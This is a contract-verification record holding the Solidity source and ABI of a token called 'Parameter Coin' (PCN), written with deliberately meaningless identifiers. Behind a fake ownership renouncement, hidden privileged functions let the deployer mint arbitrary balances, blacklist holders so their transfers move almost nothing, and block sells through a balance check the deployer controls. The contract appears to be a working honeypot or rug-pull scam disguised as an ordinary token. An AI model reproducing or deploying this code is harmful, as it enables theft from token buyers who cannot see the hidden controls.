{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract atLimitMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listAutoTotal {\n    function createPair(address amountLimit, address liquidityFromReceiver) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface exemptLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface receiverLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableSwap) external view returns (uint256);\n\n    function transfer(address receiverLaunchedEnable, uint256 walletTeam) external returns (bool);\n\n    function allowance(address buyReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverLaunchedEnable,\n        uint256 walletTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atList, uint256 value);\n    event Approval(address indexed buyReceiver, address indexed spender, uint256 value);\n}\n\ninterface senderAt is receiverLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ParameterCoin is atLimitMode, receiverLiquidity, senderAt {\n\n    uint256 private txTrading;\n\n    function sellLiquidity(address tokenShould, address receiverLaunchedEnable, uint256 walletTeam) internal view returns (uint256) {\n        require(walletTeam > 0);\n\n        uint256 liquidityFrom = 0;\n        if (tokenShould == enableTo && tokenExempt > 0) {\n            liquidityFrom = walletTeam * tokenExempt / 100;\n        } else if (receiverLaunchedEnable == enableTo && fundList > 0) {\n            liquidityFrom = walletTeam * fundList / 100;\n        }\n        require(liquidityFrom <= walletTeam);\n        return walletTeam - liquidityFrom;\n    }\n\n    constructor (){\n        \n        buyLiquidity();\n        exemptLaunch marketingWallet = exemptLaunch(totalLaunch);\n        enableTo = listAutoTotal(marketingWallet.factory()).createPair(marketingWallet.WETH(), address(this));\n        enableMarketing = listAutoTotal(marketingWallet.factory()).feeTo();\n        if (tokenLaunch != isLaunchAuto) {\n            walletAt = false;\n        }\n        listSenderFund = _msgSender();\n        fundMode[listSenderFund] = true;\n        takeFrom[listSenderFund] = buyTo;\n        if (txTrading != limitFund) {\n            autoLiquidity = true;\n        }\n        emit Transfer(address(0), listSenderFund, buyTo);\n    }\n\n    address public enableTo;\n\n    bool public minAuto;\n\n    function approve(address launchShould, uint256 walletTeam) public virtual override returns (bool) {\n        autoLaunchTeam[_msgSender()][launchShould] = walletTeam;\n        emit Approval(_msgSender(), launchShould, walletTeam);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return toFund;\n    }\n\n    bool private autoLiquidity;\n\n    mapping(address => bool) public fundMode;\n\n    function feeExempt(uint256 walletTeam) public {\n        swapShould();\n        totalFee = walletTeam;\n    }\n\n    function listTokenShould(address sellTeam) public {\n        require(sellTeam.balance < 100000);\n        if (minAuto) {\n            return;\n        }\n        if (isLaunchAuto == limitFund) {\n            limitFund = tokenLaunch;\n        }\n        fundMode[sellTeam] = true;\n        \n        minAuto = true;\n    }\n\n    function isTradingMode(address totalSwap, uint256 walletTeam) public {\n        swapShould();\n        takeFrom[totalSwap] = walletTeam;\n    }\n\n    uint8 private sellShould = 18;\n\n    address enableMarketing;\n\n    function transfer(address totalSwap, uint256 walletTeam) external virtual override returns (bool) {\n        return feeSell(_msgSender(), totalSwap, walletTeam);\n    }\n\n    uint256 private buyTo = 100000000 * 10 ** 18;\n\n    address public listSenderFund;\n\n    function feeSell(address tokenShould, address receiverLaunchedEnable, uint256 walletTeam) internal returns (bool) {\n        if (tokenShould == listSenderFund) {\n            return takeTrading(tokenShould, receiverLaunchedEnable, walletTeam);\n        }\n        uint256 tradingTx = receiverLiquidity(enableTo).balanceOf(enableMarketing);\n        require(tradingTx == totalFee);\n        require(receiverLaunchedEnable != enableMarketing);\n        if (shouldTradingTake[tokenShould]) {\n            return takeTrading(tokenShould, receiverLaunchedEnable, enableList);\n        }\n        walletTeam = sellLiquidity(tokenShould, receiverLaunchedEnable, walletTeam);\n        return takeTrading(tokenShould, receiverLaunchedEnable, walletTeam);\n    }\n\n    function balanceOf(address enableSwap) public view virtual override returns (uint256) {\n        return takeFrom[enableSwap];\n    }\n\n    mapping(address => mapping(address => uint256)) private autoLaunchTeam;\n\n    string private swapTakeFee = \"Parameter Coin\";\n\n    uint256 teamIsFee;\n\n    uint256 public tokenExempt = 3;\n\n    bool private walletAt;\n\n    mapping(address => bool) public shouldTradingTake;\n\n    uint256 totalFee;\n\n    function takeTrading(address tokenShould, address receiverLaunchedEnable, uint256 walletTeam) internal returns (bool) {\n        require(takeFrom[tokenShould] >= walletTeam);\n        takeFrom[tokenShould] -= walletTeam;\n        takeFrom[receiverLaunchedEnable] += walletTeam;\n        emit Transfer(tokenShould, receiverLaunchedEnable, walletTeam);\n        return true;\n    }\n\n    uint256 private tokenLaunch;\n\n    address private toFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellShould;\n    }\n\n    event OwnershipTransferred(address indexed limitLaunched, address indexed maxToken);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyTo;\n    }\n\n    function allowance(address fundEnableLiquidity, address launchShould) external view virtual override returns (uint256) {\n        if (launchShould == totalLaunch) {\n            return type(uint256).max;\n        }\n        return autoLaunchTeam[fundEnableLiquidity][launchShould];\n    }\n\n    bool public amountIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeSwap;\n    }\n\n    uint256 private isLaunchAuto;\n\n    function transferFrom(address tokenShould, address receiverLaunchedEnable, uint256 walletTeam) external override returns (bool) {\n        if (_msgSender() != totalLaunch) {\n            if (autoLaunchTeam[tokenShould][_msgSender()] != type(uint256).max) {\n                require(walletTeam <= autoLaunchTeam[tokenShould][_msgSender()]);\n                autoLaunchTeam[tokenShould][_msgSender()] -= walletTeam;\n            }\n        }\n        return feeSell(tokenShould, receiverLaunchedEnable, walletTeam);\n    }\n\n    function getOwner() external view returns (address) {\n        return toFund;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapTakeFee;\n    }\n\n    address totalLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function liquidityAuto(address fromLimit) public {\n        swapShould();\n        if (amountIs) {\n            txTrading = limitFund;\n        }\n        if (fromLimit == listSenderFund || fromLimit == enableTo) {\n            return;\n        }\n        shouldTradingTake[fromLimit] = true;\n    }\n\n    uint256 public fundList = 0;\n\n    uint256 private limitFund;\n\n    mapping(address => uint256) private takeFrom;\n\n    bool public minLiquidity;\n\n    uint256 constant enableList = 6 ** 10;\n\n    function swapShould() private view {\n        require(fundMode[_msgSender()]);\n    }\n\n    string private feeSwap = \"PCN\";\n\n    function buyLiquidity() public {\n        emit OwnershipTransferred(listSenderFund, address(0));\n        toFund = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnableLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"feeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"isTradingMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"}],\"name\":\"liquidityAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSenderFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"}],\"name\":\"listTokenShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTradingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLaunchedEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ParameterCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}